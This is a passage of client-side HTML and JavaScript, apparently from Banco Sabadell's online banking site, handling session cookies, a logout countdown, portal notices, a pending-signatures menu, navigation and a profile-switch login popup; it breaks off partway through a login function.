						createCookie('segmento', 'Particulares');
						if(theSite!='SabAtl')
						{	
							if(theSite!='BSAndorra')
							{
								if(theSite!='BancoSabadellUK')
								{
									if(theSite!='BSParis')
									{
										if(theSite!='BSCasablanca')
										{
											if(theSite!='BSMiami')
											{
												createCookie('rutaTransaccional', 'txbs/', 1);
											}
										}
									}
								}
							}
						}
					}
				</script>
				
		<script type="text/javascript">
			var varRutaTrans = 'txbs/';
			var demo = 'null';
			var varSite = 'SabAtl';
			var varSegmento = readCookie('segmento');
			
			if(varRutaTrans=='null') 
			{
				if(varSite=='SabAtl')
				{
					if(varSegmento) 
					{
						if(varSegmento.charAt(0) == 'P')
						{
							varRutaTrans='txbs/';
						}
						else
						{
							varRutaTrans='txempbs/';
						}
					}
					if (demo)
					{
						varRutaTrans='txdemoem/';
					}
				}
				if(varSite=='BC')
				{
					if(varSegmento) 
					{
						if(varSegmento.charAt(0) == 'P')
						{
							varRutaTrans='txbc/';
						}
						else
						{
							varRutaTrans='txempbc/';
						}
					}
				}
				if(varSite=='SabUbp')
				{
					varRutaTrans='txsbp/';
				}
        if(varSite=='BSCasablanca')
				{
					varRutaTrans='txempbsc/';
				}
        if(varSite=='BSMiami')
				{
					varRutaTrans='txbsmi/';
				}   
        if(varSite=='BancoSabadellUK')
				{
					varRutaTrans='txempbsl/';
				}  
        if(varSite=='BSAndorra')
				{
					varRutaTrans='txbsa/';
				}        
        if(varSite=='BSParis')
				{
					if(varSegmento) 
					{
						if(varSegmento.charAt(0) == 'P')
						{
							varRutaTrans='txbsp/';
						}
						else
						{
							varRutaTrans='txempbsp/';
						}
					}
				}
			}

		</script>
		<style type="text/css">#mbox{background-color:#fff; padding:8px; border:2px outset #666; padding: 15px; border: 0; box-sizing: initial; height:auto;}#mbm{font-family:sans-serif;font-weight:bold;float:right;padding-bottom:5px;}#ol{background-image: url(/StaticFiles/GrupoBS/img/overlay.png);}.dialog {display:none}.dialink {cursor:pointer; color:#900;text-decoration:underline;}.t_div_empty{background-color:#cccccc;border:1px solid #393939;height:20px;width:98%;padding:0px;}.t_div_d2{border:1px solid #6994c9;background-image: url(/StaticFiles/SabAtl/img/bg.jpg); layer-background-image: url(/StaticFiles/SabAtl/img/bg.jpg); position:relative; top:0px; left:0px; height:18px; width:0px; padding-top:5px; padding:0px;}.t_div_d1{position:relative;top:0px;left:0px;color:#f0ffff;height:20px;text-align:center;font:bold;padding:0px;padding-top:2px;}</style><script type="text/javascript">
		var theSite = 'SabAtl';
		
		if(theSite=='SabAtl' || theSite=='BSAndorra' || theSite=='BancoSabadellUK' || theSite=='BSParis' || theSite=='BSCasablanca' || theSite=='BSMiami')
		{
			var varTransaccionalKeepAlive = '/'+ varRutaTrans + 'touchservlet';
			var varTransaccionalLogout = '/'+ varRutaTrans + 'end.doLogout.bs';
		}
		else
		{		
			var varTransaccionalKeepAlive = '/'+readCookie('rutaTransaccional') + 'touchservlet';
			var varTransaccionalLogout = '/'+readCookie('rutaTransaccional') + 'end.doLogout.bs';
		}
	
	</script><script type="text/javascript">
				var username = readCookie('username');
					
				if(username!=null){
					varTransaccionalTimeSesion = '270000';
				}

			</script><div id="boxDesconexion" class="dialog"><div class="container"><div id="countdown"><div id="countdown-number">30</div><svg viewBox="0 0 105 105"><circle class="bg-circle" r="48" cx="50" cy="50"></circle><circle class="fill-circle" r="48" cx="50" cy="50"></circle></svg></div></div><div class="askDesconx"><span id="askDesc">Por seguridad, tu sesión se cerrará pronto<br></span><br><div class="resetSS"><span id="status"></span></div><button id="btnsalir" onclick="Salir();">Cerrar ahora</button><button class="btn-continue" onclick="Continuar();">Seguir navegando</button></div></div><script>
			
				var countdownNumber = document.getElementById('countdown-number');
				var countdown = 30;

				countdownNumber.textContent = countdown;

				if (readCookie('segmento') === "Empresas" || readCookie('segmento') === "Empreses" || readCookie('segmento') === "Enpresak" || readCookie('segmento') === "Business" || readCookie('segmento') === "Entreprises" || readCookie('segmento') === "Firmen"){
					document.getElementById("askDesc").innerHTML = "Por seguridad, su sesi&oacute;n se cerrar&aacute; pronto<br/>";
				}else{
					document.getElementById("askDesc").innerHTML = "Por seguridad, tu sesi&oacute;n se cerrar&aacute; pronto<br/>";
				}

			</script><div id="boxActualizar1" class="dialog">
            <br>
            <br>
            <br>
            <div style="font-family: Arial,Helvetica,sans-serif; font-size: 28px; color: #4AA5E6;font-weight:bold;text-align:center;">Aviso de cambio de portal<br>
            <br>
            </div>
            
            <div style="font-family: Arial,Helvetica,sans-serif; font-size: 20px; color: black;font-weight:bold; text-align:center;">
			null<br>
           &nbsp;&nbsp;recuerde que para firmar operaciones deberá<br>&nbsp;&nbsp;utilizar su tarjeta de claves de SabadellCAM<br>
           <br>
            </div>
           <br>
           <br>
           &nbsp;&nbsp;&nbsp;&nbsp;
          <button style="background-color:#4AA5E6; font: bold 12px Arial;color: white ; width:160px; height:30px;" onclick="Continuar1();">Continuar</button>&nbsp;&nbsp;
           &nbsp;&nbsp;<button style="background-color:#4AA5E6; font: bold 12px Arial;color: white ; width:160px; height:30px;" id="btnsalir" onclick="Cancelar1();">Cancelar</button>
           </div><div id="boxActualizar3" class="dialog">
           <br>
           <br>
           <br>
           <div style="font-family: Arial,Helvetica,sans-serif; font-size: 28px; color: #4AA5E6;font-weight:bold;text-align:center;">Aviso de cambio de portal<br>
           <br>
           </div>
           
           <div style="font-family: Arial,Helvetica,sans-serif; font-size: 20px; color: black;font-weight:bold; text-align:center;">
			Va a acceder a BS Online de Banco Sabadell,<br>
          &nbsp;&nbsp;recuerde que para firmar operaciones deberá<br>&nbsp;&nbsp;utilizar su tarjeta de claves de Banco Sabadell<br>
          <br>
           </div>
          <br>
          <br>
          &nbsp;&nbsp;&nbsp;&nbsp;
         <button style="background-color:#4AA5E6; font: bold 12px Arial;color: white ; width:160px; height:30px;" onclick="Continuar3();">Continuar</button>&nbsp;&nbsp;
          &nbsp;&nbsp;<button style="background-color:#4AA5E6; font: bold 12px Arial;color: white ; width:160px; height:30px;" id="btnsalir" onclick="Cancelar3();">Cancelar</button>
          </div><div id="boxActualizar2" class="dialog">
          
            <br>
            <br>
            <br>
            <div style="font-family: Arial,Helvetica,sans-serif; font-size: 28px; color: #4AA5E6;font-weight:bold;text-align:center;">Aviso de cambio de portal<br>
            <br>
            </div>
          <br>
          
          <div style="font-family: Arial,Helvetica,sans-serif; font-size: 20px; color: black;font-weight:bold; text-align:center;">
           null<br>
           &nbsp;&nbsp; Debe conectarse con la clave de acceso de SabadellCAM y recuerde que para firmar operaciones deberá utilizar su tarjeta de claves de SabadellCAM<br>
          <br>
          </div>
          <br>
          <br>
          &nbsp;&nbsp;&nbsp;&nbsp;
         <button style="background-color:#4AA5E6; font: bold 12px Arial;color: white ; width:160px; height:30px;" onclick="Continuar2();">Continuar</button>&nbsp;&nbsp;
         &nbsp;&nbsp;<button style="background-color:#4AA5E6; font: bold 12px Arial;color: white ; width:160px; height:30px;" id="btnsalir" onclick="Cancelar2();">Cancelar</button>
         </div><div id="boxActualizar4" class="dialog">
         
         <br>
            <br>
            <br>
            <div style="font-family: Arial,Helvetica,sans-serif; font-size: 28px; color: #4AA5E6;font-weight:bold;text-align:center;">Aviso de cambio de portal<br>
            <br>
            </div>
          <br>
                   
           <div style="font-family: Arial,Helvetica,sans-serif; font-size: 20px; color: black;font-weight:bold; text-align:center;">
           Va a acceder a BS Online de Banco Sabadell,<br>
           &nbsp;&nbsp; Debe conectarse con la clave de acceso de Banco Sabadell y recuerde que para firmar operaciones deberá utilizar su tarjeta de claves de Banco Sabadell<br>
          <br>
          </div>
          <br>
          <br>
                  &nbsp;&nbsp;&nbsp;&nbsp;
                 <button style="background-color:#4AA5E6; font: bold 12px Arial;color: white ; width:160px; height:30px;" onclick="Continuar4();">Continuar</button>&nbsp;&nbsp;
                  &nbsp;&nbsp;<button style="background-color:#4AA5E6; font: bold 12px Arial;color: white ; width:160px; height:30px;" id="btnsalir" onclick="Cancelar4();">Cancelar</button>
          </div>
		
		
		
		<script type="text/javascript">

        	if(username!=null){var interOpBS_cookie = readCookie('interOpBS');
             
				var segmento = 'Particulares';
			
				if(readCookie('segmento') != null){
					if(readCookie('segmento').charAt(0)=='P') {
						segmento = 'Particulares';
					}
					else{ 
						segmento = 'Empresas';
					}
				}
			
				jQuery('#botonLap').html('<img id="campana" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/lapiz2.png"/>');
				jQuery('#nombreUsuario').html(username + '<img id="iconUser" height="8" width="15" src="https://www.bancsabadell.com/StaticFiles/SabAtl/img/down2.png"/><br/><span id="segmentoUsuario">' + segmento + '</span>');
							
				if (document.getElementById('botonDer')) document.getElementById('botonDer').style.cursor="pointer";
				if (document.getElementById('usuario')) document.getElementById('usuario').style.visibility="visible";
				if (document.getElementById('botonLap')) document.getElementById('botonLap').style.visibility="visible";
				if (document.getElementById('nombreUsuario')) document.getElementById('nombreUsuario').style.visibility="visible";
				if (document.getElementById('segmentoUsuario')) document.getElementById('segmentoUsuario').style.visibility="visible";

				
				
				//document.getElementById('botonDesconectar').value = 'Desconectar';
			 
				
              	
                    try {
			    	    document.getElementById('botonCambioBancoSabadell').value = 'Ir a Banco Sabadell';
			        	document.getElementById('botonCambioSabadellCAM').value = 'null';			  			        
                    } catch (e) {}
               	
	        }else{
				var expdate = new Date();
			    expdate.setTime (expdate.getTime() - (24 * 60 * 60 * 1000)); 
				SetCookie ("interOpBS", "" , expdate, "/");
	  		}

      	</script>
      	<script type="text/javascript">
	//<![CDATA[
	var controlLlamadaFirma = false;
	jQuery("#campana").click(function(){
		jQuery("#tooltipsLapiz").css("display","none");
		var valCoockieAlert = cookies.getCookie("SA_Alert");
		var docVal = "0";
		if(valCoockieAlert != ""){
			docVal = valCoockieAlert.split("_")[2];
		}
		if(docVal == "0"){
			sinFirmaDoc();
		}else{
			//Hay documentos a firmar
			//Si el menu existe
			if(document.getElementById('menuFirmas') != null){
				//Si el menu estÃ¡ mostrÃ¡ndose
				if(!jQuery("#menuFirmas").is(":hidden")){
					//Ocultamos el menu
					jQuery('#menuFirmas').slideUp("slow");
				//Si el menu estÃ¡ oculto
				}else{
					//Lo mostramos
					jQuery('#menuFirmas').slideDown("slow");
				}
			//Si el menu no existe
			}else{
				//Lo creamos y lo mostramos si es la primera vez
				if(!controlLlamadaFirma){
					controlLlamadaFirma = true;
					sendRequest("/" + rutaTx + "HeaderDocsQueryServlet?numResults=3&signType=D&numPendingDocs="+docVal,obtenerDatos);
					jQuery('#menuFirmas').slideDown("slow");
				}
			}
		}
	});
	jQuery("#campana").mouseover(function(){
		if(jQuery("#tooltipsLapizClick").css('display') == "none" && (jQuery("#menuFirmas").is(":hidden") || jQuery("#menuFirmas").length == 0)){
			jQuery("#tooltipsLapiz").css("display","block");
		}
    });
	jQuery("#campana").mouseout(function(){
		jQuery("#tooltipsLapiz").css("display","none");
    });
    jQuery("#campana2").click(function(){
		jQuery("#tooltipsLapiz").css("display","none");
		var valCoockieAlert = cookies.getCookie("SA_Alert");
		var docVal = "0";
		if(valCoockieAlert != ""){
			docVal = valCoockieAlert.split("_")[2];
		}
		if(docVal == "0"){
			sinFirmaDoc();
		}else{
			//Hay documentos a firmar
			//Si el menu existe
			if(document.getElementById('menuFirmas') != null){
				//Si el menu estÃ¡ mostrÃ¡ndose
				if(!jQuery("#menuFirmas").is(":hidden")){
					//Ocultamos el menu
					jQuery('#menuFirmas').slideUp("slow");
				//Si el menu estÃ¡ oculto
				}else{
					//Lo mostramos
					jQuery('#menuFirmas').slideDown("slow");
				}
			//Si el menu no existe
			}else{
				//Lo creamos y lo mostramos si es la primera vez
				if(!controlLlamadaFirma){
					controlLlamadaFirma = true;
					sendRequest("/" + rutaTx + "HeaderDocsQueryServlet?numResults=3&signType=D&numPendingDocs="+docVal,obtenerDatos);
					jQuery('#menuFirmas').slideDown("slow");
				}
			}
		}
	});
	jQuery("#campana2").mouseover(function(){
		if(jQuery("#tooltipsLapizClick").css('display') == "none" && (jQuery("#menuFirmas").is(":hidden") || jQuery("#menuFirmas").length == 0)){
			jQuery("#tooltipsLapiz").css("display","block");
		}
    });
	jQuery("#campana2").mouseout(function(){
		jQuery("#tooltipsLapiz").css("display","none");
    });
	
	function obtenerDatos(request) {
		try{
			var json = request.responseText;
			if(json.length > 0){
				var response = JSON.parse(json);
				var aux = true;
				var listado = document.createElement('ul');
				listado.id = 'menuFirmas';
				var cabecera = document.createElement('li');
				cabecera.className = 'cabeceraFirmas';
				cabecera.innerHTML = 'Firmas pendientes <span style="float: right; margin-right: 10px;cursor: pointer;" id="cerrarFirmas" onclick="hideMenuFirmas(); return false">X</span>';
				var pie = document.createElement('li');
				pie.className = 'pieFirmas';
				var enlacePie = document.createElement('a');
				enlacePie.innerHTML = 'Ver todas';
				enlacePie.href = '/'+rutaTx+'DDPositionNew.init.bs?segmento='+segmento;
				pie.appendChild(enlacePie);
				listado.appendChild(cabecera);
				for(i=0;response.documents.length>i;i++){
					var documento = response.documents[i];
					var expireDate = documento.expireDate;
					var id = documento.id;
					var typeDoc = documento.typeDoc;
					var description = documento.description;
					var owner = documento.owner;
					var opcion = document.createElement('li');
					if(aux){
						opcion.className ='opcionMenu';
						aux = false;
					}else{
						opcion.className='opcionMenuWhite';
						aux = true;
					}
					var enlace = document.createElement('a');
					var div = document.createElement('div');
					var table = document.createElement('table');
					var body = document.createElement('tbody');
					var tr = document.createElement('tr');
					var td = document.createElement('td');
					var td2 = document.createElement('td');
					td.style.width = "70%";
					td.innerHTML = '<span style="font-weight: bold">' + description + '</span></br>Firmar antes: ' + expireDate; 
					if(owner == "true"){
						enlace.href = '/'+rutaTx+'DDPositionNew.init.bs?numDoc=' + id;
						enlace.innerHTML = 'Firmar';
						td2.style.width = "20%";
						enlace.className ='botonFirma';
						td2.appendChild(enlace);

					}  else {
						enlace.href = '/'+rutaTx+'DDPositionNew.init.bs?segmento='+segmento;
						enlace.innerHTML = 'Firmar otros';
						td2.style.width = "27%";
						var divtd2 = document.createElement('div');
						td2.appendChild(divtd2);
						divtd2.style.width = "87px";
						enlace.style.color = "#40B2D9";
						enlace.style.textDecoration = "none";
						enlace.className ='botonFirma2';
						divtd2.appendChild(enlace);
					}
					div.appendChild(table);
					table.appendChild(body);
					body.appendChild(tr);
					tr.appendChild(td);
					tr.appendChild(td2);
					opcion.appendChild(div);
					listado.appendChild(opcion);
				}
				if(response.documents.length >= 3){
					listado.appendChild(pie);
				}
				listado.style.display = 'none';
				document.getElementById('header').appendChild(listado);
				if(jQuery("#campana2").length){
					jQuery("#menuFirmas").css("margin-left",858 - jQuery("#menuUsuarioCabecera").width());
				}
				jQuery('#menuFirmas').slideDown("slow");
			}	
		}catch(err){}				
	}
	function sinFirmaDoc () {
		document.location.href='/'+rutaTx+'DDPositionNew.init.bs';
	}
	//]]>
</script>
	<script type="text/javascript">var varMenuBSOnlineTxPart = '/txbs/ChangeLocale.init.bs?locale=CAS';var varMenuBSOnlineTxEmp = '/txempbs/ChangeLocale.init.bs?locale=CAS';if( document.getElementById('a_BSonline')!=null) {var segm = readCookie('segmento');if( username!=null){if( segm!=null){if ( segm.charAt(0)=='P') {document.getElementById('a_BSonline').href = varMenuBSOnlineTxPart;}else{document.getElementById('a_BSonline').href = varMenuBSOnlineTxEmp;}}}}</script><script type="text/javascript">imprimir='Imprimir';ayudaQgo='Ayuda';cerrarQgo='Cerrar';pslogo();</script><script type="text/javascript">
			var perfilesDesactivarIE = 'NOHAYPERFILESPARADESACTIVAR';
			if(username!=null){
				var alertCookie = readCookie('SA_Alert');
					
				if(alertCookie==null){
					var numMessages = 0;
					var numOperations = 0;
					var numFiles = 0;
					var http_request = false;
					var rutaTx = 'txbs/';
					var urlOrigen = document.URL;if (urlOrigen.indexOf("LoginOperator")==-1) {
						sendRequest('/txbs/LoginFW.getInfo.bs',getPendingMessagesAJAXResponse);
						if (readCookie('segmento') === "Empresas" || readCookie('segmento') === "Empreses" || readCookie('segmento') === "Enpresak" || readCookie('segmento') === "Business" || readCookie('segmento') === "Entreprises" || readCookie('segmento') === "Firmen"){
							var controlCenterPorcentaje = 'CONTROL_CENTER_100';
							sendRequest('/txbs/LoginFW.getInfoNumAccounts.bs',getAccountsEmpCCF);
						}
					}
				}
			}

		</script></div></div>
	  
	  
	  
	<script type="text/javascript">
		jQuery(document).ready(function(){ 
			jQuery("input[name='c']").each(function( index ) {
				if (jQuery(this).val() == "GBS_Form_FA") {
					var idPageMenu = jQuery(".filaSuperiorSeleccionada").attr("id");
					jQuery('<input name="idPageMenu" type="hidden" value="' + idPageMenu + '"/>').insertAfter(this);
				}
			});
		 });
	</script>

	
	
	
		
		
	
		
		
		
			<div id="menuSuperior">
				<div id="menuListado"> 
					<table id="menuInformacional">
						<tbody>
							<tr>
								
								
						      		
						      		
						      		
						      		
						      		
						      						      	
								
								
								
								
														      	
						      	
    								
    								
								
								
						      	<td class="filaSuperior" style="display: table-cell;">
						      		<a href="/cs/Satellite/SabAtl/Inicio/1191332204474/es/" class="enlaceSuperior ">Inicio</a>
						      	</td>
						      	
										 
										 	
											
											
										 
										 
										 
										 	
											
											
											
							             
							             
											
												
												
											
										 
								             	<td class="filaSuperior 1191332200838" id="1191332200838" style="display: table-cell;">
								             		<a href="/cs/Satellite/SabAtl/Cuentas/1191332200838/es/" class="enlaceSuperior">Cuentas</a>
								             	</td>
								            
										 
										 	
											
											
										 
										 
										 
										 	
											
											
											
							             
							             
											
												
												
											
										 
								             	<td class="filaSuperior 1191332197906" id="1191332197906" style="display: table-cell;">
								             		<a href="/cs/Satellite/SabAtl/Tarjetas/1191332197906/es/" class="enlaceSuperior">Tarjetas</a>
								             	</td>
								            
										 
										 	
											
											
										 
										 
										 
										 	
											
											
											
							             
							             
											
												
												
											
										 
								             	<td class="filaSuperior 6000025917352" id="6000025917352" style="display: table-cell;">
								             		<a href="/cs/Satellite/SabAtl/Ahorro/6000025917352/es/" class="enlaceSuperior">Ahorro</a>
								             	</td>
								            
										 
										 	
											
											
										 
										 
										 
										 	
											
											
											
							             
							             
											
												
												
											
										 
								             	<td class="filaSuperior 6000025847575" id="6000025847575" style="display: table-cell;">
								             		<a href="/cs/Satellite/SabAtl/Inversion/6000025847575/es/" class="enlaceSuperior">Inversión</a>
								             	</td>
								            
										 
										 	
											
											
										 
										 
										 
										 	
											
											
											
							             
							             
											
												
												
											
										 
								             	<td class="filaSuperior 1191332201843" id="1191332201843" style="display: table-cell;">
								             		<a href="/cs/Satellite/SabAtl/Hipotecas/1191332201843/es/" class="enlaceSuperior">Hipotecas</a>
								             	</td>
								            
										 
										 	
											
											
										 
										 
										 
										 	
											
											
											
							             
							             
											
												
												
											
										 
								             	<td class="filaSuperior 1191332203554" id="1191332203554" style="display: table-cell;">
								             		<a href="/cs/Satellite/SabAtl/Prestamos-y-creditos/1191332203554/es/" class="enlaceSuperior">Préstamos y créditos</a>
								             	</td>
								            
										 
										 	
											
											
										 
										 
										 
										 	
											
											
											
							             
							             
											
												
												
											
										 
								             	<td class="filaSuperior 1191332197613" id="1191332197613" style="display: table-cell;">
								             		<a href="/cs/Satellite/SabAtl/Seguros/1191332197613/es/" class="enlaceSuperior">Seguros</a>
								             	</td>
								            
										 
										 	
											
											
										 
										 
										 
										 	
											
											
											
							             
							             
											
												
												
											
										 
								             	<td class="filaSuperior 6000035874718" id="6000035874718" style="display: table-cell;">
								             		<a href="/cs/Satellite/SabAtl/Renting/6000035874718/es/" class="enlaceSuperior">Renting</a>
								             	</td>
								            
							</tr>
						</tbody>
					</table>
				</div>
			</div>


  <div id="popUpDual" style="z-index: 997;" class="overlayPopUpDual">
    <div class="cuerpoModulo" id="popUpDualBody">
      <p>Cargando...</p>
    </div>
  </div>
  <div style="display:none;position:absolute;" id="popUpDualPat1">
  	<a id="cerrarPopUpDual" href="#">×</a>
  	<div class="tituloPopUpDual" style="text-align:left;"><span class="iconoPopUpDualCand">I</span> Introduce tu clave para cambiar de perfil</div>
  	<div class="rowPopUpDual">
  		<div class="contPopUpDualPerfil">
  			<div class="contLogoPopUpDual"><span class="iconoPopUpDualEmp">#icono</span></div><div class="contPopUpDualUsuario"><span class="filaPopUpDualTexto">#nombreusuario</span><span class="filaPopUpDualTexto">#titulo</span></div>
  		</div>
  	</div>
  </div>

  <div style="display:none;position:absolute;" id="popUpDualPat2">
  	<div class="rowPopUpDual">
  		<div class="contPopUpDualPasword">
  			<div class="filaPopUpDualPasword">
  				<p>Contraseña</p>
  			</div>
  			<div class="filaPopUpDualPasword">
  				<span class="formPopUpDual">
  					#inputDual
  				</span>
  			</div>
  			<div class="filaPopUpDualForgotten">
  				<a class="forgottenLinkPopUpDual" onclick="forgottenpinDual();" href="#">¿Has olvidado tu contraseña?</a>
  			</div>
  		</div>
  	</div>
  </div>

  <div style="display:none; position:absolute;" id="popUpDualPat2error">
  	<div class="rowPopUpDual">
  		<div class="contPopUpDualPasword">
  			<div class="filaPopUpDualPasword">
  				<p>Contraseña</p>
  			</div>
  			<div class="filaPopUpDualPasword">
  				<span class="formPopUpDual">
  					#inputDual
  				</span>
  			</div>
  			<div class="filaPopUpDualPasword">
  				<p class="errorPopUpDualPasword">Vuelve a intentarlo o recupera tu contraseña</p>
  			</div>
  			<div class="filaPopUpDualForgotten">
  				<a class="forgottenLinkPopUpDual" onclick="forgottenpinDual();" href="#">¿Has olvidado tu contraseña?</a>
  			</div>
  			<div class="filaPopUpDualForgotten" style="padding-top: 4px;">
  				<p>Por seguridad, después de 5 intentos fallidos deberás recuperar tu contraseña <a onclick="forgottenpinDual();" href="#">aquí</a>.</p>
  				<br>
  				<p>¿No tienes banca a distancia? Date de alta en menos de un minuto.</p>
  			</div>
  		</div>
  	</div>
  </div>

  <div style="display:none; position:absolute;" id="popUpDualPat3">
    <div class="rowPopUpDual">
  		<div class="contPopUpDualButton">
  			<button type="buttonl" onclick="doLoginDual()" id="submitLoginDual" name="buttonPopUpDualLogin" disabled="">Entrar</button>
  		</div>
  	</div>
  </div>
  <div name="formDual" id="formDual" style="display:none;">
  </div>
  <script src="https://www.bancsabadell.com/StaticFiles/GrupoBS/js/hashtable.js" type="text/javascript"></script>
  <script src="https://www.bancsabadell.com/StaticFiles/GrupoBS/js/rsa.js" type="text/javascript"></script>
  <script>
    function addInputsDual(){
  		var form1 = $("#formDual");
  		for (x=0;x<functions.length;x++){
  			inputAtributes(form1, functions[x], x);
  		}
    }

    function getParameterLoginDual(name) {
      name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
      var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
      results = regex.exec(location.search);
      return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
    }

    function logoutDual(logoutURL) {
      var keyRandom = getKeyRandom();
    	if (logoutURL.indexOf("?")!=-1) {
    		logoutURL = logoutURL + "&key=" + keyRandom;
    	} else {
    		logoutURL = logoutURL + "?key=" + keyRandom;
    	}
      $.ajax({
            url: logoutURL,
            type: "GET",
            success: function (data) {
              return true;
            },
            error: function (error) {
              console.log("Error" + error);
              return false;
            },
            async: false
        });
    }

    function forgottenpinDual() {
      var contextoActual = getContextoActual();
      if (contextoActual == "txempbs/") {
        var urlForggotenDual = "/txbs/" + "SVForgottenPinNew.init.bs?locale=" + getParameterLoginDual("language") + "&csid=" + getJSESSIONID_JBSWL();
      } else if (contextoActual == "txbs/") {
        var urlForggotenDual = "/txempbs/" + "SVForgottenPinEmp.init.bs?locale=" + getParameterLoginDual("language") + "&csid=" + getJSESSIONID_JBSWL();
      } else if (contextoActual == "txsbp/") {
        var urlForggotenDual = "/txempbs/SVForgottenPinEmp.init.bs?locale=" + getParameterLoginDual("language") + "&csid=" + getJSESSIONID_JBSWL();
      } else {
        var urlForggotenDual = "/" + contextoActual + "SVForgottenPinNew.init.bs?locale=" + getParameterLoginDual("language") + "&csid=" + getJSESSIONID_JBSWL();
      }
      if (logoutDual(window.location.protocol + '//' + window.location.host + varTransaccionalLogout)) {
        if (segmentoLoginDual.charAt(0)=='P') {
          setUnescapeCookie("segmento", "Empresas", 1);
        } else {
          setUnescapeCookie("segmento", "Particulares", 1);
        }
        window.location = urlForggotenDual;
      } else {
        if (segmentoLoginDual.charAt(0)=='P') {
          setUnescapeCookie("segmento", "Empresas", 1);
        } else {
          setUnescapeCookie("segmento", "Particulares", 1);
        }
        window.location = urlForggotenDual;
        console.error("Se a producido un error controlado en el logout");
      }
    }

    function getTokenSAMLLoginDual() {
      var tokenSAMLValue = '';
      $.ajax({
        url: "/"+getContextoActual()+"JSONUtils.json.bs?operEvent=SAMLTokenDirectIn&operName=SAMLToken&operHandler=native",
        dataType: "json",
        data: {entryid:"logindual", fillEvision:"N"},
        type: "POST",
        success: function(response){
          tokenSAMLValue = response.B64SAMLToken.replace(/(\r\n|\n|\r)/gm, "");
        },
        error: function(error){
          console.error("Error al obtener el tokenSAML" + error);
          tokenSAMLValue = '';
        },
        async: false
      });
      return tokenSAMLValue;
    }

    function doLoginDual() {
      var flagDual = 0;
      var pwPDual = /[^A-Z0-9]/gi;
      var passDual = $('#passwordDual').val();
      $('#passwordDual').val('');
      $('#passwordDual').prop('disabled', true);
      $('#submitLoginDual').prop('disabled', true);
      if ((passDual == "")||(typeof(passDual) == "undefined")||(pwPDual.test(passDual))) flagDual = 2;
      if (flagDual != 0) {
        errorLoginDualPass();
      } else {
        var dniUserDual = "";
        $.ajax({
              url: window.location.origin + endPointLoginDual +"/LoginFW.getInfo.bs",
              type: "GET",
              success: function (data) {
                var datosUsuarioGetInfo = JSON.parse(data);
                if (datosUsuarioGetInfo[0].id) {
                  if (datosUsuarioGetInfo[0].id.value) {
                    $('#userDNIDual').val(datosUsuarioGetInfo[0].id.value);
                  }
                }
              },
              error: function (error) {
                console.error("Error: " + error);
              },
              async: false
          });
        var lenguageLoginDual = "CAS";

        $('#pinDual').val(passDual);
        $('#languageDual').val(lenguageLoginDual);
        $('#msgLoginDual').val("PERTaWduYXR1cmVDbGllbnQtT3BlcmF0aW9uPkdlbmVyaWNTaWduPC9EU2lnbmF0dXJlQ2xpZW50LU9wZXJhdGlvbj48RFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXIgbmFtZT0iRGF0YSI+MTE5MjYwNjc2NTY3MDwvRFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXI+PERTaWduYXR1cmVDbGllbnQtUGFyYW1ldGVyIG5hbWU9IlNpZ25hdHVyZVR5cGUiPlN0YW5kYXJkPC9EU2lnbmF0dXJlQ2xpZW50LVBhcmFtZXRlcj48RFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXIgbmFtZT0iUHJvdmlkZXIiPjwvRFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXI+PERTaWduYXR1cmVDbGllbnQtUGFyYW1ldGVyIG5hbWU9IkFwcGxpY2F0aW9uIj5CUzwvRFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXI+PERTaWduYXR1cmVDbGllbnQtUGFyYW1ldGVyIG5hbWU9Ik5vQ2VydGlmaWNhdGVzVVJMIj4vdHhicy9zdGFydC5pbml0LmJzPC9EU2lnbmF0dXJlQ2xpZW50LVBhcmFtZXRlcj48RFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXIgbmFtZT0iSWRpb21hSUQiPjE8L0RTaWduYXR1cmVDbGllbnQtUGFyYW1ldGVyPjxEU2lnbmF0dXJlQ2xpZW50LVBhcmFtZXRlciBuYW1lPSJJZ25vcmVUb2tlbiI+ZmFsc2U8L0RTaWduYXR1cmVDbGllbnQtUGFyYW1ldGVyPjxEU2lnbmF0dXJlQ2xpZW50LVBhcmFtZXRlciBuYW1lPSJJbWFnZUdyYWRpZW50ZSI+L2czcmVwb3NpdG9yeS9HRU4vTE9HT19CU19MT0dPQlMuR0lGPC9EU2lnbmF0dXJlQ2xpZW50LVBhcmFtZXRlcj48RFNpZ25hdHVyZUNsaWVudC1QYXJhbWV0ZXIgbmFtZT0iTG9nb1Byb3ZpZGVyVVJMIj4vZzNyZXBvc2l0b3J5L0dFTi9MT0dPX0JTX0xPR09CUy5HSUY8L0RTaWduYXR1cmVDbGllbnQtUGFyYW1ldGVyPg==");
